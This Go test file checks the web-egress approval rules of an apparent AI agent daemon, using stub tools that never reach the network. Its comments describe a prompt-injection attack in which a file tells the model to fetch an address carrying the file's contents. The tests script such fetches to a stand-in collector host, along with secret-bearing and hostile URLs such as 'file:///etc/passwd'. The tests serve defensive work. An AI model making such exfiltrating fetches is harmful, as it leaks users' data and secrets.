package main

import (
	"context"
	"encoding/json"
	"go/ast"
	"go/parser"
	"go/token"
	"strings"
	"testing"
	"time"

	"mochiii/daemon/mcp"
	"mochiii/protocol"
)

// Tests for webegress.go: what a web call may carry out, and when anyone is
// asked (since 2026-11-21: only when the configuration says "ask").
//
// THE TOOLS HERE ARE STUBS, and that is deliberate. What is under test is the
// loop's rule -- which calls are asked about, and what a grant covers -- so the
// policy is the real one (configPolicy over a real Config), the loop is the
// real one, and the three tools record what they were handed instead of
// touching a network or a disk. No test in this file can send a packet.

// webRule is one driven turn: what the stub tools were asked to send.
type webRule struct {
	searched, fetched []string
	res               agentResult
}

// runWebRule drives one turn in which the model makes the scripted calls.
// policy is the configuration's word on both web tools; searchReturns is what
// the stub search engine "returns"; ledger is nil for an ordinary turn.
func runWebRule(t *testing.T, policy string, appr approver, prompt string, searchReturns []string, ledger *turnLedger, responses ...[]string) *webRule {
	t.Helper()
	base, _, _ := agentUpstream(t, responses...)
	cfg := MCPConfig{Enabled: true, Builtin: MCPBuiltinConfig{Tools: map[string]string{
		"read_file": PolicyAllow, "web_search": policy, "web_fetch": policy,
	}}}
	s := loopServer(t, base, cfg)

	run := &webRule{}
	registry := mcp.NewRegistry(configPolicy{cfg: s.cfg}, s.cfg.MCP.Budget.resolvedMaxAdvertisedToolsFor("auto"))
	t.Cleanup(func() { _ = registry.Close() })
	arg := func(raw json.RawMessage, key string) string {
		var m map[string]string
		_ = json.Unmarshal(raw, &m)
		return m[key]
	}
	stubs := []mcp.Builtin{
		{Tool: mcp.Tool{Name: "read_file", Description: "stub", Schema: schema(`{"type":"object"}`), ReadOnlyHint: true, Confined: true},
			Handler: func(context.Context, json.RawMessage) (mcp.Result, error) {
				return mcp.Result{Content: "launch date: PLANTED-NOTE-777"}, nil
			}},
		{Tool: mcp.Tool{Name: "web_search", Description: "stub", Schema: schema(`{"type":"object"}`), ReadOnlyHint: true, ReachesNetwork: true},
			Handler: func(_ context.Context, raw json.RawMessage) (mcp.Result, error) {
				run.searched = append(run.searched, arg(raw, "query"))
				return mcp.Result{Content: "results: " + strings.Join(searchReturns, " ")}, nil
			}},
		{Tool: mcp.Tool{Name: "web_fetch", Description: "stub", Schema: schema(`{"type":"object"}`), ReadOnlyHint: true, ReachesNetwork: true},
			Handler: func(_ context.Context, raw json.RawMessage) (mcp.Result, error) {
				run.fetched = append(run.fetched, arg(raw, "url"))
				return mcp.Result{Content: "a page"}, nil
			}},
	}
	for _, b := range stubs {
		if err := registry.RegisterBuiltin(b); err != nil {
			t.Fatal(err)
		}
	}

	res, err := s.runAgentLoop(context.Background(), time.Now(), registry, "m", "auto",
		[]chatMessage{{Role: "system", Content: "SYSTEM"}, {Role: "user", Content: prompt}}, providerRouting{}, appr,
		func(string) error { return nil }, func(protocol.ToolActivity) {}, nil, nil,
		func(protocol.Degradation) {}, nil, ledger)
	if err != nil {
		t.Fatalf("runAgentLoop: %v", err)
	}
	run.res = res
	return run
}

func fetchCall(id, url string) []string {
	return toolCallSSE(id, "builtin__web_fetch", `{"url":`+quote(url)+`}`)
}

func searchCall(id, query string) []string {
	return toolCallSSE(id, "builtin__web_search", `{"query":`+quote(query)+`}`)
}

func readCall(id string) []string {
	return toolCallSSE(id, "builtin__read_file", `{"path":"notes.md"}`)
}

// THE OWNER'S DECISION, 2026-11-21: "no need to ask the permission for using
// internet". Under "allow" no web call is asked about -- not a search made after
// the turn has read a file, not a fetch of an address the model wrote. This is
// the run that was the attack on 2026-10-07 (a file tells the model to fetch an
// address with the file's contents in it); it now goes through by decision, and
// this test keeps that a decision rather than an accident. What still stops a
// secret on the way out is TestAFetchAddressIsCheckedLikeAQuery.
func TestAllowedWebCallsAreNeverAskedAbout(t *testing.T) {
	const written = "https://collector.example/c?d=PLANTED-NOTE-777"
	appr := &capturingApprover{decision: protocol.ApprovalDeny}
	run := runWebRule(t, PolicyAllow, appr, "summarise notes.md", nil, nil,
		readCall("c1"),
		searchCall("c2", "what is PLANTED-NOTE-777"),
		searchCall("c3", "a second query"),
		fetchCall("c4", written),
		textSSE("done"))
	if prompts := appr.prompts(); len(prompts) != 0 {
		t.Fatalf("got %d prompt(s) under allow, want none: the web asks were removed (first: %+v)", len(prompts), prompts[0])
	}
	if len(run.searched) != 2 || len(run.fetched) != 1 || run.fetched[0] != written {
		t.Fatalf("searched %v, fetched %v; want both searches and the fetch to run", run.searched, run.fetched)
	}

	// The first call of a turn, and a later phase or a long task's segment,
	// are no different.
	appr = &capturingApprover{decision: protocol.ApprovalDeny}
	run = runWebRule(t, PolicyAllow, appr, "what is the launch date?", nil, &turnLedger{iterations: 3},
		fetchCall("c1", written), searchCall("c2", "q"), textSSE("done"))
	if len(appr.prompts()) != 0 || len(run.fetched) != 1 || len(run.searched) != 1 {
		t.Fatalf("a later phase: %d prompt(s), %d fetch(es), %d search(es); want 0, 1, 1",
			len(appr.prompts()), len(run.fetched), len(run.searched))
	}
}

// "YES, FOR THIS TURN" COVERS WHAT WAS ON SCREEN. It used to cover the tool, so
// one approved query vouched for every later query -- written after the model
// had read whatever the first search brought back.
func TestYesForThisTurnCoversThatWebCallAndNoOther(t *testing.T) {
	for _, policy := range []string{PolicyAsk} {
		appr := &capturingApprover{decision: protocol.ApprovalApproveForTurn}
		run := runWebRule(t, policy, appr, "summarise notes.md", nil, nil,
			readCall("c0"),
			searchCall("c1", "first query"),
			searchCall("c2", "first query"),
			searchCall("c3", "second query PLANTED-NOTE-777"),
			fetchCall("c4", "https://a.example/x"),
			fetchCall("c5", "https://a.example/x"),
			fetchCall("c6", "https://a.example/x?d=PLANTED-NOTE-777"),
			textSSE("done"))
		var asked []string
		for _, p := range appr.prompts() {
			asked = append(asked, p.Tool+" "+p.Arguments)
		}
		want := []string{
			`web_search {"query":"first query"}`,
			`web_search {"query":"second query PLANTED-NOTE-777"}`,
			`web_fetch {"url":"https://a.example/x"}`,
			`web_fetch {"url":"https://a.example/x?d=PLANTED-NOTE-777"}`,
		}
		if strings.Join(asked, "\n") != strings.Join(want, "\n") {
			t.Errorf("policy %s: asked about\n  %s\nwant\n  %s", policy, strings.Join(asked, "\n  "), strings.Join(want, "\n  "))
		}
		if len(run.searched) != 3 || len(run.fetched) != 3 {
			t.Errorf("policy %s: %d search(es) and %d fetch(es) ran, want 3 and 3 (a repeat of an approved call runs)", policy, len(run.searched), len(run.fetched))
		}
	}

	// ANTI-VACUITY for the grant itself: a tool that neither runs code nor
	// leaves the machine is still granted as a tool.
	plain := mcp.Tool{Name: "read_file"}
	if grantKey(plain, "builtin__read_file", `{"path":"a"}`) != grantKey(plain, "builtin__read_file", `{"path":"b"}`) {
		t.Error("a grant for an ordinary tool has become specific to its arguments")
	}
	web := mcp.Tool{Name: "web_search", ReachesNetwork: true}
	if grantKey(web, "builtin__web_search", `{"query":"a"}`) == grantKey(web, "builtin__web_search", `{"query":"b"}`) {
		t.Error("a grant for a web call covers a different query")
	}
}

// Under "ask" every web call is asked about: the configuration asked to see
// every one, an address the user typed or a search returned included.
func TestAskStillAsksAboutEveryWebCall(t *testing.T) {
	appr := &capturingApprover{decision: protocol.ApprovalApprove}
	run := runWebRule(t, PolicyAsk, appr, "read https://docs.example/guide", []string{"https://go.dev/x"}, nil,
		searchCall("c1", "q"), fetchCall("c2", "https://docs.example/guide"), fetchCall("c3", "https://go.dev/x"), textSSE("done"))
	prompts := appr.prompts()
	if len(prompts) != 3 || len(run.searched)+len(run.fetched) != 3 {
		t.Fatalf("under ask: %d prompt(s) for 3 calls, %d ran", len(prompts), len(run.searched)+len(run.fetched))
	}
}

func TestNormaliseWebURL(t *testing.T) {
	same := [][2]string{
		{"https://Example.com/a", "https://example.com/a"},
		{"HTTPS://example.com:443/a", "https://example.com/a"},
		{"http://example.com:80", "http://example.com/"},
		{"https://example.com/a#section", "https://example.com/a"},
		{"  https://example.com/a?x=1  ", "https://example.com/a?x=1"},
		{"https://[2001:DB8::1]:443/a", "https://[2001:db8::1]/a"},
	}
	for _, c := range same {
		a, okA := normaliseWebURL(c[0])
		b, okB := normaliseWebURL(c[1])
		if !okA || !okB || a != b {
			t.Errorf("%q and %q should be one address: %q (%v) vs %q (%v)", c[0], c[1], a, okA, b, okB)
		}
	}
	different := [][2]string{
		{"https://example.com/a", "https://example.com/A"},
		{"https://example.com/a", "https://example.com/a/"},
		{"https://example.com/a?x=1", "https://example.com/a?x=2"},
		{"https://example.com/a", "http://example.com/a"},
		{"https://example.com/a", "https://example.com:8443/a"},
		{"https://example.com/a", "https://user@example.com/a"},
		{"https://example.com/a", "https://example.com/a%2F"},
	}
	for _, c := range different {
		a, _ := normaliseWebURL(c[0])
		b, _ := normaliseWebURL(c[1])
		if a == b {
			t.Errorf("%q and %q are different addresses and normalise to the same %q", c[0], c[1], a)
		}
	}
	for _, bad := range []string{"", "example.com/a", "ftp://example.com/a", "file:///etc/passwd", "javascript:alert(1)", "https:///nohost", "://x"} {
		if n, ok := normaliseWebURL(bad); ok {
			t.Errorf("%q was accepted as a web address: %q", bad, n)
		}
	}
}

// THE ADDRESS IS OUTBOUND TEXT TOO. A query was scrubbed and capped from the
// day web_search shipped; the address web_fetch requests is the same kind of
// text and had neither check. Refused even with a yes.
func TestAFetchAddressIsCheckedLikeAQuery(t *testing.T) {
	s := builtinTestServer(t)
	s.cfg = &Config{MCP: MCPConfig{Enabled: true, Web: MCPWebConfig{TimeoutSeconds: 2}}}
	fetch := func(u string) mcp.Result {
		t.Helper()
		raw, _ := json.Marshal(map[string]string{"url": u})
		res, err := s.builtinWebFetch(context.Background(), raw)
		if err != nil {
			t.Fatalf("builtinWebFetch(%q): %v", clipForLog(u), err)
		}
		return res
	}

	const key = "sk-abcdefghijklmnopqrstuvwxyz012345"
	for _, u := range []string{
		"http://127.0.0.1:1/c?k=" + key,
		"http://127.0.0.1:1/" + key + "/x",
		"http://127.0.0.1:1/c?k=%73k-abcdefghijklmnopqrstuvwxyz012345", // percent-encoded: the same key
		"http://127.0.0.1:1/c?aws=AKIAIOSFODNN7EXAMPLE",
	} {
		res := fetch(u)
		if !res.IsError || !strings.Contains(res.Content, "secret-shaped") {
			t.Errorf("an address carrying a secret was not refused as one: %q -> %q", u, res.Content)
		}
		if strings.Contains(res.Content, key) || strings.Contains(res.Content, "AKIAIOSFODNN7EXAMPLE") {
			t.Errorf("the refusal repeats the secret: %q", res.Content)
		}
	}

	long := "http://127.0.0.1:1/c?d=" + strings.Repeat("x", maxWebURLChars)
	if res := fetch(long); !res.IsError || !strings.Contains(res.Content, "longer than an address needs to be") {
		t.Errorf("an address of %d characters was not refused for its length: %q", len(long), res.Content)
	}

	// ANTI-VACUITY: an ordinary address passes both checks. (It is then refused
	// by the address gate, which is what keeps this test off the network.)
	if res := fetch("http://127.0.0.1:1/docs/page?id=42"); strings.Contains(res.Content, "secret-shaped") || strings.Contains(res.Content, "longer than") {
		t.Errorf("an ordinary address was refused by the outbound checks: %q", res.Content)
	}
}

func clipForLog(s string) string {
	if len(s) > 80 {
		return s[:80] + "..."
	}
	return s
}

// THE WIRING. The checks on an address run only because the real fetch handler
// calls them; read from the source, the way the other wiring is checked.
func TestTheRealFetchHandlerChecksTheAddress(t *testing.T) {
	file, err := parser.ParseFile(token.NewFileSet(), "webtools.go", nil, 0)
	if err != nil {
		t.Fatal(err)
	}
	seen := false
	for _, d := range file.Decls {
		f, ok := d.(*ast.FuncDecl)
		if !ok || f.Name.Name != "builtinWebFetch" || f.Body == nil {
			continue
		}
		ast.Inspect(f.Body, func(n ast.Node) bool {
			if c, ok := n.(*ast.CallExpr); ok {
				if id, ok := c.Fun.(*ast.Ident); ok && id.Name == "outboundURLRefusal" {
					seen = true
				}
			}
			return true
		})
	}
	if !seen {
		t.Error("builtinWebFetch no longer checks the address it is about to request (outboundURLRefusal)")
	}
}

// The startup warning must describe what "allow" does NOW: every call, after a
// read too, so a call can carry what the model read.
func TestTheStartupWarningSaysWhatAllowCovers(t *testing.T) {
	cfg := &Config{MCP: MCPConfig{Enabled: true, Builtin: MCPBuiltinConfig{Tools: map[string]string{
		"web_search": PolicyAllow, "web_fetch": PolicyAllow,
	}}}}
	cfg.warnMCPPolicySurface()
	warnings := strings.Join(cfg.Warnings(), "\n")
	for _, want := range []string{
		"REACH THE INTERNET",
		"including after it has read",
		"can carry what it read",
		"stripped or refused",
	} {
		if !strings.Contains(warnings, want) {
			t.Errorf("the startup warning does not say %q:\n%s", want, warnings)
		}
	}
}
